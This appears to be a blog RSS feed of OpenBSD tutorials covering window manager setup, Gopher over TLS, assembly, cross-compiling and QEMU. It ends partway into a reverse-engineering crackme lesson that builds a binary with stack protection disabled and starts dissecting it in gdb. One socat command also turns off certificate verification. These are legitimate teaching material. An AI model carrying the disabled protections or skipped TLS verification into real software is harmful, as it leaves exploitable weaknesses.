<li>Iridium is a secure build of Google&#8217;s Chromium source, removing a lot of the spyware and crap left behind.  It also has some proactively secure features, such as password amnesia. Add the <a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb">Vimium</a> extension for decent keyboard-controlled browsing (ProTip: alt-F to start). If you prefer a more pure option, <a href="https://www.reddit.com/user/ander_bsd">ander_bsd</a> recommended vimb and shared his config <a href="https://www.reddit.com/r/openbsd/comments/a2p2gk/openbsd_desktop_for_minimalists/eb02kap/">here</a></li>
<li>mupdf is a simple PDF viewer - but more featureful than xpdf. There is also poppler-utils if you want pdftohtml or pdftotext (and of course poppler itself which is a fork of xpdf).</li>
<li>mpv is a media player based on mplayer</li>
<li>ratpoison is my window-manager of choice. Written in C with tiling. No mouse required (hence the name).</li>
</ul>

<p>I used to start X from the console, but following a woopsie involving Xorg being setuid, OpenBSD revoked that privilege and now users should use xenodm(1) to start X and their window manager. Let&#8217;s create our ratpoison session in ~&#47;.xsession:</p>

<pre><code>xset b off
xrdb -merge ~&#47;.Xresources
xidle -delay 5 -sw -timeout 300 -program "&#47;usr&#47;X11R6&#47;bin&#47;xlock -mode qix" &#38; 
exec &#47;usr&#47;local&#47;bin&#47;ratpoison
</code></pre>

<ul>
<li>The first command stops that awful beeping. As sensitive creatures who sit up late hacking away at something, it&#8217;s too much.</li>
<li>The second merges .Xresources with our current X resources.</li>
<li>Finally, we start a timer for xlock then execute our window manager - ratpoison!</li>
</ul>

<p>A basic ~&#47;.ratpoisonrc:</p>

<pre><code>startup_message off
escape Super_L
bind i exec iridium
bind t exec tor-browser
bind r exec xterm -e rtorrent
bind x exec xterm -fa "xft:Inconsolata:pixelsize=16"
exec &#47;usr&#47;local&#47;bin&#47;rpws init 6 -k
exec xterm -fa "xft:Inconsolata:pixelsize=16"
</code></pre>

<ul>
<li>Stop telling us about the help shortcut</li>
<li>Use the Windows&#47;Meta&#47;Left-Super key instead of C-t</li>
<li>Bind keys to applications</li>
<li>Create 6 virtual desktops&#47;workstations</li>
<li>Start xterm when ratpoison starts</li>
</ul>

<p>As much as I like the retro SunOS look of xterm with a white background, I like to tweak the look slightly in ~&#47;.Xresources:</p>

<pre><code>*visualBell: True 
xterm.loginShell: true 
xterm*faceName: Inconsolata:size=16
xterm*dynamicColors: true
xterm*utf8: 2
xterm*eightBitInput: true
xterm*scrollBar: false
xterm*foreground: rgb:a8&#47;a8&#47;a8
xterm*background: rgb:00&#47;00&#47;00
</code></pre>

<p>*visualBell flashes the screen since we have the audible bell disabled. Perhaps not a great idea if you have certain forms of epilepsy; Keep pressing backspace for more info.</p>

<p>Press Ctrl-Alt-Backspace to restart X and return to Xenodm, then login again.</p>

<p>You should now be presented with a lovely rxvt terminal with a black background. Here are some keyboard shortcuts to help you get started:</p>

<ul>
<li>ALT+F1-F6 - Change to desktop&#47;workstation 1-6</li>
<li>WIN x - start urxvt</li>
<li>WIN i - start iridium browser</li>
<li>WIN t - start Tor browser</li>
<li>WIN r - start rtorrent </li>
<li>WIN ! - execute command</li>
<li>WIN SHIFT+K - kill current window</li>
<li>WIN ? - show all keyboard shortcuts</li>
</ul>

<p>As for tmux(1) which is included in base and a window manager (albeit for shells) in its own right, CTRL-b :split-window -h, :split-window, and the arrow keys are your friends.</p>

<p>Have fun! </p>

]]></description>
</item>

<item>
<guid>/articles/gophernicus.html</guid>
<link>/articles/gophernicus.html</link>
<pubDate>Sat, 17 Nov 2018 00:00:00 +0000</pubDate>
<title>Down the Gopher hole with OpenBSD, Gophernicus, and TLS</title>
<description><![CDATA[

<h1 id="down-the-gopher-hole-with-openbsd-gophernicus-and-tls">Down the Gopher hole with OpenBSD, Gophernicus, and TLS</h1>

<p><strong>UPDATE: I&#8217;ve added TLS support to Gophernicus so you don&#8217;t need to use stunnel anymore. The code is ugly and unpolished though so I wouldn&#8217;t recommend for production use.</strong> </p>

<ul>
<li><a href="https://github.com/danielnechtan/gophernicus">https:&#47;&#47;github.com&#47;danielnechtan&#47;gophernicus</a></li>
<li><a href="https://github.com/danielnechtan/gophernicus/blob/master/INSTALL.openbsd">INSTALL.openbsd</a></li>
</ul>

<p><img src="/gopher-tls.png" alt="Gophernicus+TLS" /></p>

<p>In the early 2000s I thought I had seen the worst of the web - Java applets, Macromedia (&#62;Adobe) Flash, animated GIFs, javascript snow that kept you warm in the winter by burning out your CPU, and so on.  For a time we learned from these mistakes, and started putting the burden on the server-side - then with improvements in javascript engines we started abusing it again with JSON&#47;AJAX and it all went down hill from there.</p>

<p>Like cloud computing, blockchains, machine learning and a tonne of other a la mode technologies around today - most users and service providers don&#8217;t need websites that consume 1GB of memory processing JS and downloading 50MB of compressed data just to read Alice&#8217;s one-page travel blog or Bob&#8217;s notes on porting NetBSD to his blood-pressure monitor.</p>

<p>Before the HTTP web we relied on Prestel&#47;Minitel style systems, BBS systems, and arguably the most accessible of all - Gopher! Gopher was similar to the locally accessed AmigaGuide format, in that it allowed users to search and retrieve documents interactively, with links and cross-references. Its efficiency and distraction-free nature make it attractive to those who are tired of the invasive, clickbait, ad-filled, javascript-laden web2&#47;3.x. But enough complaining and evangelism - here&#8217;s how to get your own Gopher Hole!</p>

<p>Gophernicus is a modern gopher daemon which aims to be secure (although it still uses inetd -_-); it&#8217;s even in OpenBSD ports so at least we can rely on it to be reasonably audited. Let&#8217;s install that and also an ncurses-based gopher client (or lynx(1)) to test things out later:</p>

<pre><code>$ doas pkg_add gophernicus gopher
</code></pre>

<p>If you plan on offering Gopher over TLS:</p>

<pre><code>$ doas pkg_add stunnel
</code></pre>

<p>Instruct inetd(8) how to handle gopher connections (defaults to port 70 TCP) by adding this to &#47;etc&#47;inetd.conf</p>

<pre><code>gopher stream tcp nowait _gophernicus &#47;usr&#47;local&#47;libexec&#47;in.gophernicus in.gophernicus -h go.cryogenix.net
</code></pre>

<ul>
<li>Replace go.cryogenix.net with your FQDN. </li>
<li>Add <strong>-T 343</strong> if you plan on using TLS on port 343 (IANA has no port allocated for Gopher over TLS but 343 is unassigned and I came across a post with someone mentioning it as a possibility).</li>
</ul>

<p>See <strong>&#47;usr&#47;local&#47;share&#47;doc&#47;gophernicus&#47;README</strong> for a full listing of command-line arguments and usage options; Gophernicus is feature-rich so it&#8217;s recommended you RTFM carefully.</p>

<p>If you are using TLS, add a [gophernicus] service to &#47;etc&#47;stunnel&#47;stunnel.conf. For the cert and key, I just added an alternative name for my domain in &#47;etc&#47;acme-client.conf, moved the old cert and ran <strong>acme-client -vFAD cryogenix.net</strong> to update my Let&#8217;s Encrypt cert:</p>

<pre><code>[gophernicus]
cert = &#47;etc&#47;ssl&#47;cryogenix.net.crt
key = &#47;etc&#47;ssl&#47;private&#47;cryogenix.net.key
accept = 343
connect = 127.0.0.1:70
protocol = proxy
</code></pre>

<p>Create a directory for our virtual host&#8217;s gopher hole and copy the default &#8216;index&#8217; to it so we can test it:</p>

<pre><code>$ doas mkdir &#47;var&#47;gopher&#47;go.cryogenix.net
$ doas cp &#47;var&#47;gopher&#47;gophermap &#47;var&#47;gopher&#47;go.cryogenix.net&#47;
</code></pre>

<p>Enable and start inetd (and optionally stunnel):</p>

<pre><code>$ rcctl enable inetd
$ rcctl start inetd

$ rcctl enable stunnel
$ rcctl start stunnel
</code></pre>

<p>If you had no errors, you should now be able to use gopher(1) to connect to your server - either by hostname [and optional port] or gopher:&#47;&#47; url.</p>

<pre><code>$ gopher gopher:&#47;&#47;go.cryogenix.net
</code></pre>

<p>If you used stunnel(1) to TLSify Gophernicus, one way you can connect with gopher(1) over TLS on port 343 is by using stunnel(1) on the client or socat(1):</p>

<pre><code>$ pkg_add stunnel
</code></pre>

<p>Add the following to &#47;etc&#47;stunnel&#47;stunnel.conf:</p>

<pre><code>[gophers]
client = yes
accept = 127.0.0.1:10343
connect = &#60;hostname&#62;:343
CApath = &#47;etc&#47;ssl&#47;cert.pem
</code></pre>

<p>Then start stunnel with rcctl and connect gopher to 127.0.0.1:10343.</p>

<p>Alternatively, with socat:</p>

<pre><code>$ doas pkg_add socat
$ socat TCP4-LISTEN:10070 openssl-connect:go.cryogenix.net:343,cafile=&#47;etc&#47;ssl&#47;cert.pem,method=TLS1.2,verify=0,reuseaddr &#38;
$ gopher gopher:&#47;&#47;localhost:10070
</code></pre>

<h5 id="caveats">Caveats</h5>

<ul>
<li>when connecting to stunnel, libressl returns error 21 (unable to verify first cert) - however the same cert returns no error on port 443 (httpd(8)).</li>
<li>socat(1) will die when the connection is closed or reaches EOF, which is on every gopher request. Normally we would add the &#8216;fork&#8217; option to the end of the openssl-connect command but for some reason it causes gopher(1) to become a runaway process and eat up CPU time.</li>
</ul>

<p>If you need a starting point with Gopher, SDF-EU&#8217;s wiki has a good article <a href="https://sdfeu.org/w/tutorials:gopher">here</a>.</p>

<p>Finally, if you don&#8217;t like gopher(1) - there&#8217;s always lynx(1) or <a href="https://cryogenix.net/NCSA_Mosaic_OpenBSD.html">NCSA Mosaic</a>!</p>

<p><img src="/gop2.jpg" alt="Gopher client viewing cryogenix" />
<img src="/gop3.jpg" alt="Gopher client viewing cryogenix" />
<img src="/gop.jpg" alt="Gopher on Mosaic Screenshot" /></p>

]]></description>
</item>

<item>
<guid>/articles/openbsd_assembly.html</guid>
<link>/articles/openbsd_assembly.html</link>
<pubDate>Thu, 15 Nov 2018 00:00:00 +0000</pubDate>
<title>Assembly language on OpenBSD amd64+arm64</title>
<description><![CDATA[

<h1 id="assembly-language-on-openbsd-amd64arm64">Assembly language on OpenBSD amd64+arm64</h1>

<p>This is a short introduction to assembly language programming on OpenBSD&#47;amd64+arm64.  Because of security features in the kernel, I have had to rethink a series of tutorials covering Aarch64 assembly language on OpenBSD, and therefore this will serve as a placeholder-cum-reminder.</p>

<p>OpenBSD, like many UNIX and unix-like operating systems, now uses the Executable and Linkable Format (ELF) for its binary libraries and executables.  Although the structure of this format is beyond the scope of this short introduction, it is necessary for me to explain part of one of the headers.</p>

<p>Within the program header there are sections known as PT_NOTE that OpenBSD and other systems use to distinguish their ELF executables - OpenBSD looks for this section to check if it should attempt to execute the program or not.</p>

<p>The section uses a structure similar to the following:</p>

<pre><code>PT_NOTE {
    long    namesz;   &#47;* size of name *&#47;
    long    descsz;   &#47;* size of desc *&#47;
    long    type;     &#47;* ABI type? *&#47;
    char    name;     &#47;* ABI&#47;vendor name *&#47;
    long    desc;     &#47;* description *&#47;
}
</code></pre>

<p>For our assembled programs to link and execute correctly, we must create this section; If you are an ld(1) wizard, you can also use PHDRS to accomplish this. </p>

<h5 id="our-first-program-in-c">Our first program: in C!</h5>

<p>It&#8217;s often a good idea to prototype your assembly programs in a high level language such as C - it can then double up as both a set of notes and a working program that you can debug and compile into assembly language to compare with your own asm code. Create sysexit.c:</p>

<pre><code>#include &#60;unistd.h&#62;
#include &#60;sys&#47;syscall.h&#62;

int
main(void)
{
    syscall(SYS_exit, 123);
return 0;
}
</code></pre>

<p>OK, return 0 here is a little redundant as we have already called SYS_exit() to exit our program.</p>

<p>Compile with LLVM:</p>

<pre><code>clang -o sysexit sysexit.c
</code></pre>

<p>Or with GNU:</p>

<pre><code>gcc -o sysexit sysexit.c
</code></pre>

<p>If you run the program, it should do nothing - just silently exit and return you to the shell prompt.  Exciting! Next we will rewrite this program in assembly language.</p>

<h5 id="our-first-program-in-x86-64-asm-attgas-syntax">Our first program: in x86-64 Asm (AT&#38;T&#47;GAS syntax)</h5>

<p>x86-64 General Purpose Registers:</p>

<pre><code>RAX    Accumulator
RBX    Base
RCX    Counter
RDX    Data (can extent Accumulator)
RSI    Source Index for string ops
RDI    Destination Index for string ops
RSP    Stack Pointer
RBP    Base Pointer
R8-15  General purpose 
</code></pre>

<p>System calls such as exit&#47;SYS_exit are defined in <strong>sys&#47;syscall.h</strong> - assemblers, unlike C compilers, can&#8217;t use these C&#47;C++ include files so we need to extract defines and macros from them to implement in assembly. That said, some fancy assemblers such as FASM and NASM may provide macros for common types and functions&#8230; but we&#8217;re good purists so won&#8217;t mention those. </p>

<p>If you look at &#47;usr&#47;include&#47;sys&#47;syscall.h you will see SYS_exit is defined near the top of the file:</p>

<pre><code>&#47;* syscall: "exit" ret: "void" args: "int" *&#47;
#define SYS_exit    1
</code></pre>

<p>Our exit syscall returns void and takes one int as an argument. SYS_exit itself is is defined as &#8216;1&#8217;.  So when we make a syscall and pass SYS_exit, we are actually passing an integer that represents the function.</p>

<p>Syscall numbers are loaded into the rax register, and any parameters are put int rdi, rsi, rdx, etc. Any return value is left in rax.</p>

<p>Equipped with this knowledge and the previous notes about the ELF program header, we can write our first assembly program, sysexit.s:</p>

<pre><code>.section ".note.openbsd.ident", "a"
    .p2align 2      &#47;* padding *&#47;
    .long 0x8       &#47;* namesz *&#47;
    .long 0x4       &#47;* descsz *&#47;
    .long 0x1       &#47;* type *&#47; 
    .ascii "OpenBSD"      &#47;* name *&#47;
    .long 0x0       &#47;* desc *&#47;
    .p2align 2      

.section .text      &#47;* .text section begins *&#47;
.globl _start       &#47;* make _start symbol global&#47;known to ld *&#47;
_start:
movq $1,%rax        &#47;* copy 1 (SYS_exit) into rax register *&#47;
movq $123,%rdi      &#47;* 1st parameter: 123 *&#47;
syscall         &#47;* call syscall (int 0x80 on 32-bit) *&#47;
</code></pre>

<p>Assemble and link with GNU tools:</p>

<pre><code>$ as sysexit.s -o sysexit.o
$ ld sysexit.o -o sysexit --dynamic-linker &#47;usr&#47;libexec&#47;ld.so
</code></pre>

<p>For a static executable:</p>

<pre><code>$ ld -e _start -static sysexit.o -o sysexit
</code></pre>

<ul>
<li>-e _start instructs the linker to use _start as an entry symbol&#47;point</li>
<li>-static is required otherwise the resulting shared executable will look for &#47;lib&#47;ld64.so.1 (which doesn&#8217;t exist) - thanks &#47;u&#47;Kernigh!</li>
</ul>

<p>Execute our program and print the exit code:</p>

<pre><code>$ .&#47;sysexit
$ echo $?
</code></pre>

<h5 id="our-first-program-in-inline-x86-64-assembly">Our first program: in inline x86-64 assembly</h5>

<p>Nowadays it&#8217;s often desirable to use inline assembly language within C programs; this allows precision control of registers and optimised routines to be made while retaining the beautiful ANSI C language for the bulk of the code.  Here&#8217;s how we implement our program using inline asm, inline.c:</p>

<pre><code>int
main(void)
{
    __asm__("mov $123, %rdi 
	"
            "mov $1, %rax 
	"
            "syscall");
}
</code></pre>

<p>Or if you want to use C variables, you could do:</p>

<pre><code>int
main(void) {
        register int arg __asm__("rdi") = 123;
        register int scall __asm__("rax") = 1;
        __asm__("syscall");
}
</code></pre>

<p>Compile as you normally would:</p>

<pre><code>$ cc -o inline inline.c
$ .&#47;inline
$ echo $?
123
</code></pre>

<p>Done! </p>

<h5 id="our-first-program-in-x86-64-asm-nasm-syntax">Our first program: in x86-64 asm (NASM syntax)</h5>

<pre><code>section .note.openbsd.ident progbits alloc noexec nowrite
    dd 0x00000008 ; namesz
    dd 0x00000004 ; descsz
    dd 0x00000001 ; type
    dd "OpenBSD", 0x00, 0x00 ; name
    dd 0x00000000

section .text
    global _start

_start:
    mov eax,0x01    ; SYS_exit
    push 0x01   ; parameter 1
    syscall     ; call syscall
</code></pre>

<p>Assemble and link:</p>

<pre><code>nasm -f elf64 sysexit-nasm.s -o sysexit-nasm.o
&#47;* ld -e _start -static -o sysexit-nasm sysexit-nasm.o *&#47;
ld -o sysexit-nasm sysexit-nasm.o --dynamic-linker &#47;usr&#47;libexec&#47;ld.so 
</code></pre>

<h5 id="our-first-program-in-armv8-aarch64-assembly">Our first program: in ARMv8 AArch64 assembly</h5>

<p>AArch64 is the 64-bit state of ARMv8 processors; these processors can run a 32-bit kernel with 32-bit userland, or a 64-bit kernel with both 32 and 64-bit userland.  The architecture changes a little when in the 64-bit state.</p>

<p>Registers:</p>

<pre><code>X0 - X7      = Argument &#47; results registers
X8           = indirect result location
X9 - X15         = temporary registers
X16 - X17        = temporary intra-proc call
X18          = platform register
X19 - X29        = Callee-saved register (must preserve)
X30          = link register
</code></pre>

<p>sysexit-arm.s:</p>

<pre><code>.section ".note.openbsd.ident", "a"
.p2align 2
.long    0x8
.long    0x4
.long    0x1
.ascii    "OpenBSD"
.long    0x0
.p2align 2

.text
.globl _start 
_start:
    mov x0, #123    &#47;* copy 123 to x0 - reverse of AT&#38;T syntax *&#47;
    mov x8, #1  &#47;* copy 1 into x8
    svc #0      &#47;* supervisor instruction - formerly swi *&#47;
</code></pre>

<p>Assemble and link:</p>

<pre><code>$ gas sysexit-arm.s -o sysexit-arm.o
$ ld sysexit-arm.o -o sysexit-arm --dynamic-linker &#47;usr&#47;libexec&#47;ld.so 

$ .&#47;sysexit-arm
$ echo $?
</code></pre>

<p>And we&#8217;re done!</p>

]]></description>
</item>

<item>
<guid>/articles/openbsd_crosscompiling_arm64.html</guid>
<link>/articles/openbsd_crosscompiling_arm64.html</link>
<pubDate>Wed, 14 Nov 2018 00:00:00 +0000</pubDate>
<title>Cross-compiling for OpenBSD&#47;arm64</title>
<description><![CDATA[

<h1 id="cross-compiling-for-openbsdarm64">Cross-compiling for OpenBSD&#47;arm64</h1>

<p>Following on from <a href="https://cryogenix.net/OpenBSD_arm64_qemu.html">OpenBSD&#47;arm64 on QEMU</a>, it&#8217;s not always practical to compile userland software or a new kernel on some systems, particularly small SoCs with limited space and memory - or indeed QEMU, in fear of melting your CPU. </p>

<p>There are two scenarios here - the first, if you are looking for a standard cross-compiler for Aarch64, and the second if you want an OpenBSD-specific environment.</p>

<h4 id="scenario-1-linaro-armaarch64-toolchain">Scenario 1: Linaro ARM&#47;AArch64 toolchain</h4>

<p>Available in ports, this is the go-to GCC toolchain for cross-compilation to ARM targets.  aarch64-none-elf-gcc-linaro is relatively new and there doesn&#8217;t exist a port for gdb nor newlib as yet.</p>

<p>This will pull in binutils and gcc, which will be installed to &#47;usr&#47;local&#47;aarch64-none-elf-*:</p>

<pre><code>doas pkg_add aarch64-none-elf-gcc-linaro
</code></pre>

<p>The 32-bit ARM toolchain is also available, which includes GDB and newlib for the ARM target. 32-bit ARM binaries will run on Aarch64, which is why you see devices such as the Raspi3 having 32-bit or mixed-arch operating systems (64-bit kernel, 32-bit userland for example).</p>

<pre><code>doas pkg_add arm-none-eabi-gcc-linaro 
doas pkg_add arm-none-eabi-gdb
doas pkg_add arm-none-eabi-newlib
</code></pre>

<p>This will give us a traditional cross-compilation environment with gdb built to use your host, in my case x86_64-unknown-openbsd6.4 and a target of arm-none-eabi. Newlib is an implementation of the standard C library which was intended to be a free library for embedded devices and is popular with OS development hobbyists at stages where they have not written their own implementations.  This will allow us to write and compile C code that uses the std C library.</p>

<h4 id="scenario-2-openbsd-aarch64-development">Scenario 2: OpenBSD aarch64 development</h4>

<p>Cross-building is unsupported on OpenBSD - if you&#8217;ve ever dabbled in OS development or LinuxFromScratch, you can probably guess why; it can be unpredictable.
Moreover, the OpenBSD platform lifecycle focuses on making OpenBSD self-hosting and only cross-compiles to the target platform for initial bootstrapping.</p>

<p>There, you have been duly warned; now let&#8217;s get down to building our AArch64 toolchain!</p>

<p>I must admit, I have never looked at &#47;usr&#47;src&#47;Makefile.cross before - so instead of jumping in I had a look to see if there was any existing resources on the process.</p>

<ul>
<li><a href="https://gist.github.com/uebayasi/6328591">openbsd-cross-building-tips</a> by <a href="https://github.com/uebayasi">Masao Uebayashi</a></li>
<li><a href="http://openbsd-archive.7691.n7.nabble.com/error-in-cross-compiling-for-armv7-td300810.html">arm@ list: error in cross-compiling for armv7</a></li>
</ul>

<p>As the process is unsupported anyway, I&#8217;m not using &#47;usr&#47;src. We can&#8217;t even build a release without hacking to death the Makefiles and wrappers so that may be in a future article.  Grab the source somewhere in your home dir:</p>

<pre><code>mkdir arm64
cd arm64
cvs -qd anoncvs@anoncvs.fr.openbsd.org:&#47;cvs checkout -rOPENBSD_6_4 -P src
</code></pre>

<p>Set some environment variables for our build tree:</p>

<pre><code>target=arm64
topdir=${HOME}&#47;arm64
srcdir=${topdir}&#47;src
destdir=${topdir}&#47;dest.${target}
objdir=${topdir}&#47;obj.${target}
toolsdir=${topdir}&#47;tools.${target}
cd ${srcdir}
</code></pre>

<p>As root, we create the directories for our toolchain, set the environment, then build the toolchain itself.  Aarch64 is strictly an llvm&#47;lld platform on OpenBSD (thanks, brynet!) - but for some reason when I tried to build the toolchain it complained about ld.bfd being missing from somewhere in ${destdir}&#8230; quick solution: touch the file and run make again as below!</p>

<pre><code>doas make -f Makefile.cross TARGET=${target} CROSSDIR=${destdir} cross-env
doas make -f Makefile.cross TARGET=${target} CROSSDIR=${destdir} cross-dirs
doas make -f Makefile.cross TARGET=${target} CROSSDIR=${destdir} cross-tools
</code></pre>

<p>Build and install Aarch64 userland to our destination:</p>

<pre><code>doas make -f Makefile.cross TARGET=${target} CROSSDIR=${destdir} cross-distrib
</code></pre>

<p>Create some convient links</p>

<pre><code>ln -sf ${destdir}&#47;usr&#47;obj ${objdir}
ln -sf ${destdir}&#47;usr&#47;${target}-unknown-openbsd6.4 ${toolsdir}
</code></pre>

<p>chown everything back to your user and group (modify as required):</p>

<pre><code>doas chown -R ${USER}:${USER} ${objdir}&#47;*
</code></pre>

<p>Finally, test our environment out by compiling a C file with cc (clang):</p>

<pre><code>$ eval export $( make -f Makefile.cross TARGET=${target} CROSSDIR=${destdir} cross-env )
$ cd ..
$ cat &#60;&#60;EOF &#62;&#62;hello.c
#include &#60;stdio.h&#62;

int
main(void) {
    printf("Hello Aarch64
");
}
EOF

$ ${CC} -o hello hello.c
$ file hello
hello: ELF 64-bit LSB shared object, AArch64, version 1

$ ${destdir}&#47;usr&#47;aarch64-unknown-openbsd6.4&#47;bin&#47;readelf -h hello

ELF Header:
Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
Class:                             ELF64
Data:                              2&#39;s complement, little endian
Version:                           1 (current)
OS&#47;ABI:                            UNIX - System V
ABI Version:                       0
Type:                              DYN (Shared object file)
Machine:                           AArch64
&#60;--CUT--&#62;
</code></pre>

<p>All working as expected!</p>

]]></description>
</item>

<item>
<guid>/articles/openbsd_arm64_qemu.html</guid>
<link>/articles/openbsd_arm64_qemu.html</link>
<pubDate>Tue, 13 Nov 2018 00:00:00 +0000</pubDate>
<title>OpenBSD&#47;arm64 on QEMU with networking</title>
<description><![CDATA[

<h1 id="openbsdarm64-on-qemu-with-networking">OpenBSD&#47;arm64 on QEMU with networking</h1>

<p>With the increasing popularity of ARM64&#47;AArch64 systems, from the Raspberry Pi 3 and PINE64 to Fujitsu&#8217;s move away from SPARC64 supercomputers, there hasn&#8217;t been a better time to get started with learning this architecture.</p>

<p>I wanted to make a start to an Aarch64 assembly language tutorial but didn&#8217;t have access to my RPi3, so I looked into the state of QEMU&#8217;s emulation. I didn&#8217;t need RPi3-specific hardware - which is just as well as I can&#8217;t remember off-hand how the bootcode and start.elf crap would work with QEMU - anyway, I opted for a generic device using Linaro&#8217;s EDK2 UEFI firmware.</p>

<p>The first pre-built EDK2 binary I downloaded wouldn&#8217;t play nicely with the OpenBSD kernel so I grabbed a release mentioned by the <a href="https://wiki.freebsd.org/arm64/QEMU">FreeBSD team</a> - which worked.</p>

<h4 id="prerequisites">Prerequisites</h4>

<ul>
<li>OpenBSD&#47;amd64 host</li>
<li>miniroot64.fs (arm64)</li>
<li><a href="http://releases.linaro.org/components/kernel/uefi-linaro/16.02/release/qemu64/QEMU_EFI.fd">QEMU_EFI.fd</a> (v16.02) </li>
<li>QEMU (doas pkg_add qemu)</li>
</ul>

<h4 id="network-prep">Network Prep</h4>

<p>The procedure here is pretty much identical to that outlined in <a href="https://www.openbsd.org/faq/faq16.html">faq16</a>. We create a vether0 and bridge0 interface for our tap interface to NAT through egress.</p>

<pre><code>$ doas su -
# echo &#39;inet 192.168.54.1 255.255.255.0 NONE&#39; &#62;&#47;etc&#47;hostname.vether0
# echo &#39;add vether0&#39; &#62;&#47;etc&#47;hostname.bridge0
# sh &#47;etc&#47;netstart vether0 
# sh &#47;etc&#47;netstart bridge0 
# sysctl net.inet.ip.forwarding=1
</code></pre>

<p>Add the following rule to &#47;etc&#47;pf.conf (replace egress if necessary with your network_interface:0):</p>

<pre><code>match out on egress from vether0:network to any nat-to (egress)
</code></pre>

<p>Reload our pf configuration:</p>

<pre><code># pfctl -f &#47;etc&#47;pf.conf
</code></pre>

<p>Create &#47;etc&#47;dhcpd.conf so your VM can use dhcp:</p>

<pre><code>option domain-name "cryogenix.net"
option domain-name-servers 1.1.1.1;

subnet 192.168.54.0 netmask 255.255.255.0 {
    option routers 192.168.54.1;
    range 192.168.54.100 192.168.54.199;
}
</code></pre>

<p>Start dhcpd:</p>

<pre><code># rcctl -f start dhcpd
</code></pre>

<h4 id="preparing-qemu">Preparing QEMU</h4>

<p>Fetch miniroot64.fs, SHA256, SHA256.sig, and QEMU_EFI.fd:</p>

<pre><code>$ ftp https:&#47;&#47;cdn.openbsd.org&#47;pub&#47;OpenBSD&#47;6.4&#47;arm64&#47;{SHA256,SHA256.sig,miniroot64.fs}
$ ftp http:&#47;&#47;releases.linaro.org&#47;components&#47;kernel&#47;uefi-linaro&#47;16.02&#47;release&#47;qemu64&#47;QEMU_EFI.fd 
$ signify -Cp &#47;etc&#47;signify&#47;openbsd-64-base.pub -x SHA256.sig miniroot64.fs
</code></pre>

<p>Create a qcow2 image to use as our disk:</p>

<pre><code>$ qemu-img create -f qcow2 root.qcow2 10G
</code></pre>

<h4 id="booting-miniroot64.fs">Booting miniroot64.fs</h4>

<p>Thanks to <a href="https://marc.info/?l=openbsd-arm&amp;m=151582483025728&amp;w=2">jsg@</a> for the -M and -device arguments to use instead of -M raspi3.</p>

<pre><code>doas sh -c "qemu-system-aarch64 -runas $USER \
-m 2048 \
-M virt \
-cpu cortex-a57 \
-bios QEMU_EFI.fd \
-device virtio-rng-device \
-drive file=miniroot64.fs,format=raw,id=drive1 \
-netdev tap,id=net0 -device virtio-net-device,netdev=net0 \
-drive file=root.qcow2,if=none,id=drive0,format=qcow2 \
-device virtio-blk-device,drive=drive0 \
-nographic \
-serial tcp::4450,server,telnet,wait"
</code></pre>

<p>In another terminal (hello, tmux!):</p>

<pre><code>$ telnet localhost 4450
&#62;&#62; OpenBSD&#47;arm64 BOOTAA64 0.13
boot&#62;
</code></pre>

<p>Proceed to install OpenBSD as normal; at set selection -x* -g* is recommended. To boot into your new system, remove the line with miniroot64.fs from the command above and perhaps saving the full command as a shell script for your convenience. We don&#8217;t need the serial console anymore if you elected to start sshd at boot, so the -serial line could either be removed or changed to &#8216;-serial FILE:serial.log&#8217;.</p>

<pre><code>Tue Nov 13 16:43:48 GMT 2018

OpenBSD&#47;arm64 (foo.cryogenix.net) (console)

login:
</code></pre>

<p>Done.</p>

<pre><code>$ uname -a
OpenBSD foo.cryogenix.net 6.4 GENERIC#511 arm64

$ sysinfo.pl
Hostname: foo - OS: OpenBSD 6.4&#47;arm64 - CPU:  - Processes: 31 
Uptime: 2m - Users: 1 - Load Average: 1.19 - 
Memory Usage: 26.94MB&#47;1990.47MB (1.35%) - 
Disk Usage: 0.62GB&#47;9.73GB (6.42%)

cc -dumpmachine: aarch64-unknown-openbsd6.4
</code></pre>

<p>As always, thank you for reading and all feedback is welcome. </p>

]]></description>
</item>

<item>
<guid>/articles/RET_level1.html</guid>
<link>/articles/RET_level1.html</link>
<pubDate>Mon, 12 Nov 2018 00:00:00 +0000</pubDate>
<title>Reverse Engineering Tutorial: level1 - What&#8217;s the password?</title>
<description><![CDATA[

<h1 id="reverse-engineering-tutorial-level1---whats-the-password">Reverse Engineering Tutorial: level1 - What&#8217;s the password?</h1>

<p>Welcome to level1 of the Reverse Engineering Tutorial.  I will be using OpenBSD 6.4&#47;amd64 to demonstrate one way to solve level1 of the 
Cryogenix wargame (yet TBA).</p>

<p>You may download the binary, or if you&#8217;re a bit tinfoilhat-inclined the source is also available.  You&#8217;ll also need gdb (lldb will be added at 
a later date), binutils, and optionally Vim.</p>

<h5 id="get-level1">Get level1</h5>

<p>Binary (OpenBSD&#47;amd64):</p>

<pre><code>ftp https:&#47;&#47;cryogenix.net&#47;RET&#47;level1&#47;level1
</code></pre>

<p>Source:</p>

<pre><code>ftp https:&#47;&#47;cryogenix.net&#47;RET&#47;level1&#47;level1.c
gcc -fno-stack-protector -o level1 level1.c
</code></pre>

<h5 id="lets-begin">Let&#8217;s begin&#8230;</h5>

<pre><code>.&#47;level1

Welcome to Cryogenix
Password: 12345

12345 is incorrect!
$
</code></pre>

<p>Our goal is, if it wasn&#8217;t immediately obvious, to find the correct password - or otherwise access what requires the correct password to 
level1.  This could be accomplished through static (disassembly) techniques, but that would be boring!  Let&#8217;s load our binary into gdb:</p>

<pre><code>$ gdb level1
</code></pre>

<p>Set a breakpoint on main() and run the program to see what we&#8217;re dealing with</p>

<pre><code>(gdb) b main
Breakpoint 1 at 0x772
(gdb) r
Breakpoint 1 at 0x54486b00772
Breakpoint 1, 0x0000054486b00772 in main ()
    from &#47;home&#47;level1&#47;level1
</code></pre>

<p>Next we instruct gdb to disassemble the current function:</p>

<pre><code>(gdb) disas

Dump of assembler code for function main:
0x0000054486b0076e &#60;main+0&#62;:    push   %rbp
76f &#60;main+1&#62;:    mov    %rsp,%rbp
772 &#60;main+4&#62;:    lea    1050137(%rip),%rdi   # 0x54486c
779 &#60;main+11&#62;:   callq  0x54486b003a0 &#60;__init+80&#62;
77e &#60;main+16&#62;:   lea    1050147(%rip),%rdi   # 0x54486c00da8
785 &#60;main+23&#62;:   mov    $0x0,%eax
78a &#60;main+28&#62;:   callq  0x54486b00370 &#60;__init+32&#62;
78f &#60;main+33&#62;:   mov    $0x0,%eax
794 &#60;main+38&#62;:   callq  0x54486b00700 &#60;checkpass&#62;
799 &#60;main+43&#62;:   leaveq
